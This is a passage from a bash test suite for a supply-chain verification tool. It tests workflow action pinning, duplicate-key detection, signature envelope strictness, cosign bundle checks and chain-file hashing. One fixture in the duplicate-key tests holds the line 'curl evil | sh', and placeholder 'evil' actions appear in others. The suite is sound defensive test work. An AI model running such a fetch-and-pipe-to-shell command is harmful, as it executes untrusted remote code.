w w_ncstep "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./.github/workflows/acts/d.yml\n"
printf 'name: t\non: workflow_call\njobs:\n  j:\n    uses: ./.github/workflows/acts/d.yml\n' > "$work/w_ncjob.yml"
expect_refuse "N-c a STEP-level local path that is a directory named d.yml holding an action.yml is followed: the unpinned action inside it is rejected" "evil/act" actions "$work/w_ncstep.yml" --allowed "$work/allowed-nc.json" --root "$work/tree"
expect_ok     "N-c the same path at JOB level is a reusable workflow file and is not opened as a directory" actions "$work/w_ncjob.yml" --allowed "$work/allowed-nc.json" --root "$work/tree"
# ---- step-8 round 4: S-1 one read of the digest file; S-2 strict base64; N-4 the PAE length is in bytes ----------------------------
python3 - "$root" "$work" "$NOW" 2>&1 <<'PY' && ok "S-1 check-build-record reads the digest file ONCE: the hash and the subjects come from the same bytes, even if the file changes after the first read" || bad "S-1 the digest file is opened more than once (or its content from a second read was used)"
import argparse, builtins, importlib.util, json, sys
root, w, now = sys.argv[1:4]
sys.path.insert(0, root + "/bin")
spec = importlib.util.spec_from_file_location("cv", root + "/bin/chain-verify.py"); m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
real_open, opened = builtins.open, []
def spy(f, *a, **k):
    if isinstance(f, str) and f.endswith("/digests.json"):
        opened.append(f)
        if len(opened) > 1: f = w + "/digests-other.json"   # the file "changes" under a second read
    return real_open(f, *a, **k)
builtins.open = spy
ns = argparse.Namespace(template=None, policy=w + "/policy.json", now=now, digests=w + "/digests.json", build_record=w + "/build_coll.json")
pol, obj = m.check_build_record(ns)
builtins.open = real_open
assert len(opened) == 1, "digest file opened %d times" % len(opened)
assert obj == json.load(open(w + "/digests.json")), "the digest object does not match the attested file"
PY
python3 - "$root" 2>&1 <<'PY' && ok "N-4 the DSSE pre-authentication length counts BYTES of the payload type, not characters" || bad "N-4 pae() counts characters"
import importlib.util, sys
root = sys.argv[1]; sys.path.insert(0, root + "/bin")
spec = importlib.util.spec_from_file_location("cv", root + "/bin/chain-verify.py"); m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
assert m.pae("\u00e9", b"x") == b"DSSEv1 2 \xc3\xa9 1 x", m.pae("\u00e9", b"x")
PY
expect_refuse "S-2 junk characters inside the payload base64 ('!!-_ ' and a newline) are refused, not dropped" "envelope" verify $(V) --stage sign $(rec sign_prov_junkpay)
expect_refuse "S-2 a '*' inside the signature base64 is refused" "malformed|signature" verify $(V) --stage sign $(rec sign_prov_junksig)
expect_refuse "S-2 the URL-safe alphabet (- and _) in the signature is refused" "malformed|signature" verify $(V) --stage sign $(rec sign_us_sig)

# ---- sign checks what cosign returned before it says ok: a bundle that is wrong is refused, and no provenance is left behind -------------------
POSTSIGN=0
expect_postsign_refuse() { local l=$1 words=$2 mode=$3 rc=0 l1 x miss=0; FAKE_BUNDLE=$mode run sign --check --signer cosign --build-record "$work/build_coll.json" \
    --policy "$work/policy.json" --digests "$work/digests.json" --out "$work/sd/post-$mode" || rc=$?
  [ -s "$work/cosign-argv.log" ] && POSTSIGN=$((POSTSIGN + 1))
  l1=$(head -n 1 "$work/err" | tr 'A-Z' 'a-z')
  grep -q '^refused at sign: ' <<< "$l1" || miss=1
  IFS='|' read -r -a ws <<< "$words"
  for x in "${ws[@]}"; do case $x in '!'*) ! grep -F -q -- "${x#!}" <<< "${l1#*: }" || miss=1 ;; *) grep -F -q -- "$x" <<< "${l1#*: }" || miss=1 ;; esac; done
  if [ "$rc" = 1 ] && [ "$miss" = 0 ] && ! crashed && [ ! -e "$work/sd/post-$mode/provenance.json" ]; then ok "$l"
  else bad "$l (exit $rc, wanted 1 with 'refused at sign:' and '$words', no provenance.json left; $(head -c 200 "$work/err" | tr '\n' ' '))"; fi; }
expect_postsign_refuse "S1 a bundle with no DSSE envelope is refused after cosign, not a traceback" "bundle|malformed" nodsse
expect_postsign_refuse "S1 a bundle that carries a certificate is refused: no certificate belongs to this chain" "certificate" withcert
expect_postsign_refuse "S1 a bundle whose signature is by a key the manifest does not name is refused: Sign verifies what it wrote before it says ok" "signature" otherkey
[ "$POSTSIGN" = 3 ] && ok "S1 control: cosign WAS called in each of the three cases above (the refusal is about the bundle, not an earlier check)" || bad "S1 cosign was called in only $POSTSIGN of the three bundle cases"
expect_ok     "S1 control: the same sign with an untouched bundle succeeds" sign --check --signer cosign --build-record "$work/build_coll.json" --policy "$work/policy.json" --digests "$work/digests.json" --out "$work/sd/post-control"
# F1 (Opus r1 verify; 001-AC2): the bundle must carry the statement Sign built; cosign signing another one is refused, naming the mismatch
expect_postsign_refuse "F1 a cosign that signs a statement with swapped subjects is refused: the signed statement is not the one Sign built" "statement" swapsubj
expect_postsign_refuse "F1 a cosign that signs a statement with a changed predicate is refused" "statement" predicate
expect_postsign_refuse "F1 a cosign that signs a statement with an appended subject is refused" "statement" addsubj
# I1: anything but a refusal inside the self-check (here openssl failing) is a refusal too, never a traceback, and leaves no provenance
cat > "$work/fakebin-openssl" <<FSSL
#!/usr/bin/env bash
if [ -e "$work/ssl-fail" ] && [ "\${1:-}" = dgst ] && [ "\${2:-}" = -sha256 ] && [ "\${3:-}" = -verify ]; then echo "fake openssl: failure" >&2; exit 1; fi
exec "$OPENSSL" "\$@"
FSSL
chmod +x "$work/fakebin-openssl"; REALSSL=$OPENSSL
OPENSSL="$work/fakebin-openssl" expect_postsign_refuse "I1 an openssl failure while Sign checks its own output is a refusal (no traceback), says openssl's exit status and what it said, and removes the output" "signature|openssl exit 1|fake openssl: failure" sslfail
OPENSSL=$REALSSL; rm -f "$work/ssl-fail"
rc=0; run sign --check --signer cosign --build-record "$work/build_coll.json" --policy "$work/policy.json" --digests "$work/digests.json" --out "$work/sd/f1-control" || rc=$?
[ "$rc" = 0 ] && [ -s "$work/sd/f1-control/provenance.json" ] && ok "F1 control: the honest fake cosign (it signs the statement Sign built) is accepted and the provenance is written" || bad "F1 control: the honest sign failed (exit $rc; $(head -c 200 "$work/err" | tr '\n' ' '))"
[ "$POSTSIGN" = 7 ] && ok "F1/I1 control: cosign WAS called in each of the four cases above" || bad "F1/I1 cosign was called in only $((POSTSIGN - 3)) of the four cases"

# H1 (Opus r1-verify info, 001-AC2): --out must not exist yet. Sign creates it and, on a refusal, removes only what it created; an existing
# path (., a directory, a file, a symlink) is a usage error before anything runs: nothing deleted, nothing written, cosign never called
expect_out_refused() { local l=$1 out=$2 dir=$3 rc=0
  (cd "$dir" && run sign --check --signer cosign --build-record "$work/build_coll.json" --policy "$work/policy.json" --digests "$work/digests.json" --out "$out") || rc=$?
  if [ "$rc" = 2 ] && ! crashed && grep -q -i "already exists" "$work/err" && [ -e "$dir/keep.txt" ] && [ -z "$(find "$dir" -name 'provenance*' -print -quit)" ] && [ ! -s "$work/cosign-argv.log" ]; then ok "$l"
  else bad "$l (exit $rc, wanted 2 'already exists', keep.txt kept, nothing written, no cosign; $(head -c 200 "$work/err" | tr '\n' ' '))"; fi; }
mkdir -p "$work/h1/dot" "$work/h1/dir/existing" "$work/h1/file" "$work/h1/link/target"
for d in dot dir dir/existing file link/target; do echo keep > "$work/h1/$d/keep.txt"; done
echo x > "$work/h1/file/out.txt"; ln -s "$work/h1/link/target" "$work/h1/link/out"
expect_out_refused "H1 --out . (the current directory) is refused, and nothing in it is deleted or written" . "$work/h1/dot"
expect_out_refused "H1 --out an existing directory is refused, and nothing in it is deleted or written" existing "$work/h1/dir"
expect_out_refused "H1 --out an existing file is refused, and the file is kept" out.txt "$work/h1/file"
expect_out_refused "H1 --out a symlink to a directory is refused, and the directory it points to is untouched" "$work/h1/link/out" "$work/h1/link/target"
rc=0; run sign --check --signer cosign --build-record "$work/build_coll.json" --policy "$work/policy.json" --digests "$work/digests.json" --out "$work/h1/fresh" || rc=$?
[ "$rc" = 0 ] && [ -s "$work/h1/fresh/provenance.json" ] && ok "H1 control: a fresh --out is created and the provenance is written there" || bad "H1 control: a fresh --out failed (exit $rc; $(head -c 200 "$work/err" | tr '\n' ' '))"
# H2 (Opus r1-verify info, 001-AC2): the signed statement must equal the built one TYPE-exactly (true is not 1, 1 is not 1.0, false is not 0)
for m in dry1 dry1f; do
  rc=0; GITHUB_REF=refs/heads/hostile-proof/x GITHUB_EVENT_NAME=workflow_dispatch FAKE_BUNDLE=$m run $(TPR build_coll h2-$m) || rc=$?
  [ -s "$work/cosign-argv.log" ] && POSTSIGN=$((POSTSIGN + 1))
  if [ "$rc" = 1 ] && ! crashed && grep -q "^refused at sign: .*statement" "$work/err" && [ ! -e "$work/sd/h2-$m/provenance.json" ]; then ok "H2 a dry run whose signed statement says dryRun $([ $m = dry1 ] && echo 1 || echo 1.0) where Sign built true is refused"
  else bad "H2 $m: wanted refused at sign ... statement, no provenance (exit $rc; $(head -c 200 "$work/err" | tr '\n' ' '))"; fi
done
python3 - "$root" 2>&1 <<'PY' && ok "H2 the statement comparison is type-exact: 1 vs true, 1.0 vs 1, 0 vs false differ (nested too); equal statements are equal" || bad "H2 the statement comparison treats bool, int and float as one type"
import importlib.util, sys
root = sys.argv[1]; sys.path.insert(0, root + "/bin")
spec = importlib.util.spec_from_file_location("cv", root + "/bin/chain-verify.py"); m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
for a, b in ((1, True), (1.0, 1), (0, False), ({"x": [1]}, {"x": [True]}), ({"p": {"dryRun": True}}, {"p": {"dryRun": 1.0}})):
    assert not m.same_json(a, b) and not m.same_json(b, a), (a, b)
for a in ({"s": [{"n": "x", "d": {"sha256": "a"}}], "p": {"dryRun": True}}, [1, 2.5, None, False, "x"]):
    assert m.same_json(a, a) and m.same_json(a, __import__("json").loads(__import__("json").dumps(a))), a
assert not m.same_json({"a": 1}, {"a": 1, "b": 2}) and not m.same_json([1], [1, 1])
PY
GITHUB_REF=refs/heads/hostile-proof/x GITHUB_EVENT_NAME=workflow_dispatch expect_ok "H2 control: the honest dry-run sign (dryRun true as built) is accepted" $(TPR build_coll h2-control)
# S3: one byte string, one spelling: a non-canonical base64 (unused padding bits set, YR== for YQ==) is refused in every field
expect_ok     "S3 control: the padded record is accepted (each field below differs from it only in its spelling)" verify $(V) --stage sign $(rec sign_pad)
expect_refuse "S3 a non-canonical payload base64 is refused" "envelope" verify $(V) --stage sign $(rec sign_nc_payload)
expect_refuse "S3 a non-canonical signature base64 is refused" "envelope|signature" verify $(V) --stage sign $(rec sign_nc_sig)

expect_refuse "S3 a signed payload holding NaN is refused (not JSON)" "predicate|!signature" verify $(V) --stage sign $(rec sign_nan)
expect_refuse "S3 an envelope holding Infinity is refused" "envelope" verify $(V) --stage sign $(rec sign_envinf)
sed 's/^{/{"nan": NaN, /' "$work/policy.json" > "$work/policy-nan.json"
expect_refuse "S3 a policy holding NaN is refused" "policy" verify --policy "$work/policy-nan.json" --stage sign $(rec sign_prov)
# S4 (001-AC1, the Sign job installs only cosign): the Sign path runs without PyYAML; only `actions` needs it and says so plainly
mkdir -p "$work/noyaml"; printf 'raise ImportError("no PyYAML here (test stub)")\n' > "$work/noyaml/yaml.py"
rc=0; PYTHONPATH="$work/noyaml" "$PY3" -S "$cv" --help > /dev/null 2> "$work/err" || rc=$?
[ "$rc" = 0 ] && ! crashed && ok "S4 python3 -S chain-verify.py --help works with PyYAML unimportable" || bad "S4 --help needs PyYAML (exit $rc; $(head -c 200 "$work/err" | tr '\n' ' '))"
PYTHONPATH="$work/noyaml" expect_ok "S4 verify (the Sign path) works with PyYAML unimportable" verify $(V) --stage sign $(rec sign_prov)
PYTHONPATH="$work/noyaml" expect_ok "S4 sign --check works with PyYAML unimportable" sign --check --signer cosign --build-record "$work/build_coll.json" --policy "$work/policy.json" --digests "$work/digests.json" --out "$work/sd/noyaml"
rc=0; PYTHONPATH="$work/noyaml" run $(A w_good) || rc=$?
[ "$rc" = 2 ] && ! crashed && grep -q -i "pyyaml" "$work/err" && ok "S4 actions without PyYAML is a clear usage error (exit 2) naming PyYAML, not a traceback" || bad "S4 actions without PyYAML (exit $rc; $(head -c 200 "$work/err" | tr '\n' ' '))"
expect_ok     "S4 control: actions works with PyYAML" $(A w_good)
# S5 (003-AC4): a repeated mapping key (compared trimmed and case-folded, like the pin checker's AC3 rule) is refused, naming the key
w w_dup2pin  "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@$a40\n        uses: actions/cache/restore@$a40\n"
w w_dupunpin "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@main\n        uses: actions/checkout@$a40\n"
w w_duppinun "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@$a40\n        uses: actions/checkout@main\n"
cat > "$FXDIR/FXD_1" <<'FXEOF'
  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: true\n        Run: curl evil | sh\n
FXEOF
FXD_1=$(cat "$FXDIR/FXD_1")
w w_duprun   "$FXD_1"
w w_dupquote "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - \"uses\": actions/checkout@main\n        uses: actions/checkout@$a40\n"
w w_duptrim  "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@$a40\n        \"uses \": actions/checkout@main\n"
w w_dupjob   "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: true\n  j:\n    uses: fosterstack/cache/.github/workflows/other.yml@main\n"
for c in w_dup2pin:uses w_dupunpin:uses w_duppinun:uses w_duprun:run w_dupquote:uses w_duptrim:uses w_dupjob:j; do
  expect_refuse "S5 ${c%%:*}: a repeated key is refused and named (duplicate '${c#*:}')" "duplicate|${c#*:}|${c%%:*}" $(A "${c%%:*}")
done
expect_refuse "R2-3 stage-start: a Witness collection attesting {\"foo\":\"bar\"} is refused for its format" "build|format" $(ST rebuild build) $(rec build_coll_foobar) --digests "$work/digests-foobar.json"
expect_refuse "R2-3 stage-start: an attested digest list with upper-case hex is refused for its format" "build|format" $(ST check build) $(rec build_coll_upper) --digests "$work/digests-upper.json"
expect_refuse "R2-4 release <- sign: a subject whose name is a list is refused" "sign|subject" $(ST release sign) $(rec sign_badname) --digests "$work/digests.json"
expect_refuse "R2-4 release <- sign: a subject whose digest is a list is refused" "sign|subject" $(ST release sign) $(rec sign_baddigest) --digests "$work/digests.json"
expect_refuse "R2-4 rebuild <- build: a product subject whose digest is a list is refused" "build|subject" $(ST rebuild build) $(rec build_baddigest) --digests "$work/digests.json"
expect_refuse "R2-4 check-build-record: Build's product subject whose digest is a list is refused (at build since r7 B6: the record's own stage, as for its identity)" "build|subject" check-build-record --policy "$work/policy.json" --build-record "$work/build_baddigest.json" --digests "$work/digests.json"
# missing cosign (Codex r1/r2 low): a refusal, not a traceback, and the fresh --out Sign made is removed
mkdir -p "$work/nocosign"; ln -s "$(command -v "$OPENSSL")" "$work/nocosign/openssl"
rc=0; env PATH="$work/nocosign" OPENSSL="$work/nocosign/openssl" "$PY3" "$cv" sign --check --signer cosign --build-record "$work/build_coll.json" --policy "$work/policy.json" --digests "$work/digests.json" --out "$work/sd/nocosign" 2> "$work/err" > "$work/out" || rc=$?
[ "$rc" = 1 ] && ! crashed && grep -q "^refused at sign: .*cosign not found" "$work/err" && [ ! -e "$work/sd/nocosign" ] && ok "R2 no cosign on PATH: refused 'cosign not found', the output folder Sign made is removed" || bad "R2 no cosign on PATH (exit $rc; $(head -c 200 "$work/err" | tr '\n' ' '))"

# ---- Codex security round 3 ----
for k in ptype_num ptype_null ptype_list ptype_dict payload_num sigs_dict sigs_item sig_num cert_null inter_str inter_item stamps_str stamps_item; do
  expect_refuse "X2 an envelope field of the wrong JSON type ($k) is refused, never a traceback" "envelope" verify $(V) --stage sign $(rec env_$k)
done
# X4: shapes GitHub would reject are refused by name, never skipped
w x4_useslist  "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: [evil/action@main]\n"
w x4_jobuses   "  j:\n    uses: [evil/repo/.github/workflows/x.yml@main]\n"
w x4_svcstr    "  j:\n    runs-on: ubuntu-24.04\n    services:\n      db: postgres:latest\n    steps:\n      - run: true\n"
w x4_svclist   "  j:\n    runs-on: ubuntu-24.04\n    services:\n      - postgres:latest\n    steps:\n      - run: true\n"
w x4_contlist  "  j:\n    runs-on: ubuntu-24.04\n    container: [ghcr.io/x/y:latest]\n    steps:\n      - run: true\n"
w x4_stepsmap  "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      a: b\n"
w x4_stepstr   "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses-evil\n"
printf 'name: t\non: workflow_call\njobs:\n  - j\n' > "$work/x4_jobslist.yml"
for c in x4_useslist:"uses" x4_jobuses:"uses" x4_svcstr:"services" x4_svclist:"services" x4_contlist:"container" x4_stepsmap:"steps" x4_stepstr:"step" x4_jobslist:"jobs"; do
  expect_refuse "X4 ${c%%:*}: a malformed shape is refused and named" "${c#*:}|not" $(A "${c%%:*}")
done

# ---- PR 4: bind-items and check-list (read-back verifier-bindings, advisor OK): refuse-only commands of Release's verify step, on the real verifier ----
BI() { echo bind-items --policy "$work/policy.json" --record "$work/$1.json" --items "$work/${2:-items}.json"; }
expect_ok     "PR4 bind-items: items.json equal to the product of Build's verified record is accepted" $(BI bi_ok)
expect_refuse "PR4 bind-items: an items.json that is not the file Build's record holds is refused" "build|items.json|digest" $(BI bi_ok items-other)
expect_refuse "PR4 bind-items: a record that holds another items.json hash is refused" "build|items.json|digest" $(BI bi_otheritems)
expect_refuse "PR4 bind-items: a record with no items.json product is refused" "build|items.json" $(BI bi_noitems)
expect_refuse "PR4 bind-items: two items.json products (one right, one wrong) are refused" "build|items.json" $(BI bi_dup)
expect_refuse "PR4 bind-items: a material subject of the same name does not count as the product" "build|items.json" $(BI bi_material)
expect_refuse "PR4 bind-items: an unsigned record is refused" "build|signature" $(BI bi_unsigned)
# REQ-CHAIN-007-AC19 (advisor ruling B, Oct 12): the same binding for a second product of Build's record, named by --product (default items.json)
BP() { echo bind-items --policy "$work/policy.json" --record "$work/$1.json" --items "$work/${2:-admission-baseline}.json" --product "${3:-admission-baseline.json}"; }
expect_ok     "AB bind-items --product: admission-baseline.json equal to its product of Build's verified record is accepted" $(BP bi_adm)
expect_refuse "AB bind-items --product: a baseline file that is not the one Build's record holds is refused" "build|admission-baseline.json|digest" $(BP bi_adm admission-baseline-other)
expect_refuse "AB bind-items --product: a record with no admission-baseline.json product (items.json only) is refused" "build|admission-baseline.json" $(BP bi_ok)
expect_refuse "AB bind-items --product: two products of that name are refused" "build|admission-baseline.json" $(BP bi_adm_dup)
expect_refuse "AB bind-items --product: a material subject of that name does not count as the product" "build|admission-baseline.json" $(BP bi_adm_material)
expect_refuse "AB bind-items --product: items.json is still bound under its own name (the default product)" "build|items.json|digest" $(BI bi_adm items-other)
expect_refuse "AB bind-items --product: a product name with a slash is refused" "build|product" $(BP bi_adm admission-baseline ../items.json)
CLS() { echo check-list --policy "$work/policy.json" --digests "$work/${2:-digests}.json" --dir "$work/$1"; }
expect_ok     "PR4 check-list: exactly scanners, acceptance, runtime and arm64, each verified, each for Build's digests, is accepted" $(CLS cl_ok)
expect_refuse "PR4 check-list: a missing record (arm64) is refused, naming Check and the record" "check|arm64|missing" $(CLS cl_missing)
expect_refuse "PR4 check-list: an extra record is refused, naming it" "check|extra" $(CLS cl_extra)
expect_refuse "PR4 check-list: a stray file inside a record directory is refused" "check|stray.json" $(CLS cl_stray)
expect_refuse "PR4 check-list: two records swapped between their slots (a substitution) are refused" "check|scanners" $(CLS cl_swapped)
expect_refuse "PR4 check-list: the scanners record presented twice (as acceptance) is refused" "check|acceptance" $(CLS cl_dup)
expect_refuse "PR4 check-list: a record substituted under another step's name is refused" "check|runtime" $(CLS cl_subst)
expect_refuse "PR4 check-list: an unverifiable (unsigned) record is refused, naming the record" "check|runtime|signature" $(CLS cl_unverifiable)
expect_refuse "PR4 check-list: the arm64 slot holding a record of the job check-arm64 (wrong job) is refused" "check|arm64" $(CLS cl_wrongjob)
expect_refuse "PR4 check-list: a record with no material digest list is refused" "check|scanners|digests" $(CLS cl_nomat)
expect_refuse "PR4 check-list: a product named like the digest list does not stand in for the material" "check|scanners|digests" $(CLS cl_prodonly)
expect_refuse "PR4 check-list: two material subjects for the digest list are refused" "check|scanners|digests" $(CLS cl_dupmat)
expect_refuse "PR4 check-list: four valid records whose digests match EACH OTHER but not Build's verified digests are refused" "check|digest" $(CLS cl_alt_digests)
expect_refuse "PR4 check-list: one record for other digests among three right ones is refused" "check|runtime|digest" $(CLS cl_onebad_digests)
expect_refuse "PR4 check-list: against another digest list of Build's none of the records matches" "check|digest" $(CLS cl_ok digests-other)
expect_refuse "PR4 check-list: an empty directory is refused" "check|missing" $(CLS cl_empty)
# ruling G: bind-check, the same binding for the one file of Check's scanners record that Release uses (govulncheck.json)
BC() { echo bind-check --policy "$work/policy.json" --record "$work/$1.json" --digests "$work/${3:-digests}.json" --file "$work/${2:-gv}.json" --product "${4:-check-results/govulncheck.json}"; }
expect_ok     "G bind-check: govulncheck.json equal to the product of Check's verified scanners record, for Build's digests, is accepted" $(BC gv_ok)
expect_refuse "G bind-check: a file that is not the one Check's record holds is refused" "check|govulncheck.json|digest" $(BC gv_ok gv-other)
expect_refuse "G bind-check: a record that holds another file's hash is refused" "check|govulncheck.json|digest" $(BC gv_otherfile)
expect_refuse "G bind-check: a record with no govulncheck.json product is refused" "check|govulncheck.json" $(BC gv_noprod)
expect_refuse "G bind-check: two products of that name are refused" "check|govulncheck.json" $(BC gv_dup)
expect_refuse "G bind-check: a material subject of that name does not count as the product" "check|govulncheck.json" $(BC gv_material)
expect_refuse "G bind-check: the record of another step (acceptance) is refused: a record is accepted only for the scanners step" "check|scanners" $(BC gv_wrongstep)
expect_refuse "G bind-check: a record about another digest list than Build's is refused" "check|digests" $(BC gv_otherdigests)
expect_refuse "G bind-check: against another digest list of Build's the record does not match" "check|digests" $(BC gv_ok gv digests-other)
expect_refuse "G bind-check: a record with no material digest list is refused" "check|digests" $(BC gv_nomat)
expect_refuse "G bind-check: an unsigned record is refused" "check|signature" $(BC gv_unsigned)
expect_refuse "G bind-check: a product name outside check-results/ is refused" "check|product" $(BC gv_ok gv digests ../gv.json)
expect_refuse "G bind-check: a product name that is not a plain file of check-results/ is refused" "check|product" $(BC gv_ok gv digests check-results/a/b.json)
expect_refuse "PR4 bind-items: a record signed by a key the manifest does not name is refused" "build|signature" $(BI bi_otherkey)
expect_refuse "PR4 check-list: a record signed by a key the manifest does not name is refused" "check|signature" $(CLS cl_otherkey)
expect_refuse "PR4 check-list: a record signed by the throwaway key is refused" "check|signature|manifest key" $(CLS cl_throwaway)
expect_refuse "G bind-check: a record signed by a key the manifest does not name is refused" "check|signature" $(BC gv_otherkey)

# ---- cutover prep (advisor Oct 12; REQ-CHAIN-001-AC6): the rc-proof marker, bin/chain-bytes-sha.py and `chain-verify.py rc-proof` ----
# bin/chain-bytes-sha.py defines the chain-file set ONCE: the workflows release.yml and stage-*.yml, every script a row of .github/policy/chain-scripts.json lists, and every file
# of .github/policy/ except the marker itself; its sha256 is taken over `<sha256>  <path>` lines sorted by path, read from the commit's objects. `check-marker` is what
# admission and the patch decide job run: the marker is the closed object {rc_tag, run_id, chain_sha256, records}, the rc tag exists and is an ancestor of the commit, and
# the chain files of the commit AND of the rc tag's commit hash to chain_sha256. `chain-verify.py rc-proof` adds the records of the rc run, verified under the rc tag's identities.
cat > "$work/mkmarker.py" <<'PY'
import hashlib, json, sys
out, rc_tag, run_id, chain, d = sys.argv[1:6]
M = {"build": "witness-build/build-collection.json", "sign": "provenance/provenance.json", "rekor": "provenance/provenance.rekor.json",
     "rebuild": "witness-rebuild/rebuild-collection.json", "hostile_verdict": "hostile-results/hostile-results.json"}
for s in ("scanners", "acceptance", "runtime", "arm64"): M[s] = "witness-check/witness-%s/%s-collection.json" % (s, s)
rec = {k: hashlib.sha256(open("%s/%s" % (d, v), "rb").read()).hexdigest() for k, v in M.items()}
json.dump({"rc_tag": rc_tag, "run_id": run_id, "chain_sha256": chain, "records": rec}, open(out, "w"), indent=1, sort_keys=True)
PY
cbx() { local rc=0; python3 "$CB" "$@" 2> "$work/cb.err" > "$work/cb.out" || rc=$?; return $rc; }
S1=; cbx sha --commit "$C1" --repo "$RG" && S1=$(cat "$work/cb.out") || true
if grep -E -q '^[0-9a-f]{64}$' <<< "$S1"; then ok "AC6 bytes: sha prints one lowercase sha256 for the chain files of a commit"; else bad "AC6 bytes: sha printed '$S1' ($(head -c 150 "$work/cb.err"))"; fi
S1b=; cbx sha --commit "$C1" --repo "$RG" && S1b=$(cat "$work/cb.out") || true
[ -n "$S1" ] && [ "$S1" = "$S1b" ] && ok "AC6 bytes: the same commit gives the same sha twice" || bad "AC6 bytes: not deterministic"
cbx list --commit "$C1" --repo "$RG" || true
lst=$(cat "$work/cb.out")
want_in="bin/b.sh bin/chain-bytes-sha.py .github/policy/chain-scripts.json .github/policy/x.json .github/workflows/release.yml .github/workflows/stage-build.yml .github/workflows/stage-sign.yml .github/workflows/stage-verify.yml"
miss=0; for f in $want_in; do grep -F -q "  $f" <<< "$lst" || miss=1; done
[ "$miss" = 0 ] && [ "$(grep -c . <<< "$lst")" = 8 ] && ok "AC6 bytes: the set is the release and stage workflows, the listed scripts and the policy files, eight files here" || bad "AC6 bytes: the set is not the eight files: $(tr '\n' ' ' <<< "$lst" | head -c 300)"
! grep -E -q 'other\.sh|ci\.yml|README' <<< "$lst" && ok "AC6 bytes: a file the chain does not use (an unlisted script, ci.yml, the README) is not in the set" || bad "AC6 bytes: an unrelated file is in the set"
shaof() { local o rc=0; o=$(python3 "$CB" sha --commit "$1" --repo "$RG" 2> /dev/null) || rc=$?; [ "$rc" = 0 ] && echo "$o" || echo "ERR$rc"; }
mutc() { # mutc NAME FILE TEXT : a commit on top of C1 with TEXT appended to FILE; prints its sha
  rcg checkout -q -b "m-$1" "$C1"; printf '%s\n' "$3" >> "$RG/$2"; rcg add -A > /dev/null; rcg commit -q -m "m-$1"; rcg rev-parse HEAD; rcg checkout -q main; }
mutrows() { # a VALID list with one more field in the first row (so the hash can only change because the list did)
  rcg checkout -q -b "m-rowsjson" "$C1"
  python3 - "$RG/.github/policy/chain-scripts.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1])); d["scripts"][0]["reason"] = "changed"; json.dump(d, open(sys.argv[1], "w"))
PY
  rcg add -A > /dev/null; rcg commit -q -m m-rowsjson; rcg rev-parse HEAD; rcg checkout -q main; }
for spec in "workflow:.github/workflows/release.yml" "stage:.github/workflows/stage-sign.yml" "script:bin/b.sh" "self:bin/chain-bytes-sha.py" "policy:.github/policy/x.json" "rows:.github/policy/chain-scripts.json"; do
  n=${spec%%:*}; f=${spec#*:}; c=$(mutc "$n" "$f" "# changed")
  [ "$n" = rows ] && c=$(mutrows)
  [[ "$(shaof "$c")" =~ ^[0-9a-f]{64}$ ]] && [ "$(shaof "$c")" != "$S1" ] && ok "AC6 bytes: a changed $n file ($f) changes the sha" || bad "AC6 bytes: a changed $f did not change the sha"
done
for spec in "other:bin/other.sh" "readme:README.md" "ci:.github/workflows/ci.yml" "marker:.github/policy/rc-proof.json"; do
  n=${spec%%:*}; f=${spec#*:}; c=$(mutc "u$n" "$f" "# changed")
  [ "$(shaof "$c")" = "$S1" ] && ok "AC6 bytes: a changed $n file ($f) is outside the set and does not change the sha" || bad "AC6 bytes: a changed $f changed the sha"
done
AG=".github/ag"ent      # assembled: the layout check refuses a file outside the agent folder that spells it out
# Codex 4b-1 r1 (B B1): the set closes over every file the chain files name or import (a script the workflow runs that no row lists, a file under the agent folder a sibling module)
rcg checkout -q -b closure "$C1"; mkdir -p "$RG/$AG/bin"
printf "name: release\njobs:\n  d:\n    steps:\n      - run: python3 bin/decide.py go\n      - run: python3 $AG/bin/sig.py\n      # see bin/x-test.sh\n" > "$RG/.github/workflows/release.yml"
mkdir -p "$RG/$AG/bin/pkg/sub" "$RG/$AG/bin/other"
printf 'import helper\nfrom pathlib import Path\nfrom pkg import mod\nimport other.thing as t\nprint(1)\n' > "$RG/$AG/bin/sig.py"; printf 'X = 1\n' > "$RG/$AG/bin/helper.py"
printf '' > "$RG/$AG/bin/pkg/__init__.py"; printf 'from .sub import deep\nfrom . import sibling\n' > "$RG/$AG/bin/pkg/mod.py"
printf 'Z = 1\n' > "$RG/$AG/bin/pkg/sibling.py"; printf '' > "$RG/$AG/bin/pkg/sub/__init__.py"; printf 'D = 1\n' > "$RG/$AG/bin/pkg/sub/deep.py"
printf '' > "$RG/$AG/bin/other/__init__.py"; printf 'T = 1\n' > "$RG/$AG/bin/other/thing.py"
printf 'import deepmod\nimport os\n' > "$RG/bin/decide.py"; printf 'Y = 1\n' > "$RG/bin/deepmod.py"; printf '#!/bin/sh\nbash bin/viab.sh\n' > "$RG/bin/b.sh"; printf '#!/bin/sh\necho v\n' > "$RG/bin/viab.sh"
printf '#!/bin/sh\n' > "$RG/bin/x-test.sh"
rcg add -A > /dev/null; rcg commit -q -m closure; CCL=$(rcg rev-parse HEAD); rcg checkout -q main
cbx list --commit "$CCL" --repo "$RG" || true; cl=$(cat "$work/cb.out")
miss=0; for f in bin/decide.py $AG/bin/sig.py $AG/bin/helper.py bin/deepmod.py bin/viab.sh $AG/bin/pkg/__init__.py $AG/bin/pkg/mod.py $AG/bin/pkg/sibling.py $AG/bin/pkg/sub/__init__.py $AG/bin/pkg/sub/deep.py $AG/bin/other/__init__.py $AG/bin/other/thing.py; do grep -F -q "  $f" <<< "$cl" || { miss=1; echo "closure: $f missing" >&2; }; done
[ "$miss" = 0 ] && ok "AC6 bytes: a script a chain workflow runs, a file under the agent folder's bin, a module a chain script imports and a script a listed script names are all in the set" || bad "AC6 bytes: the closure is missing a file the chain runs"
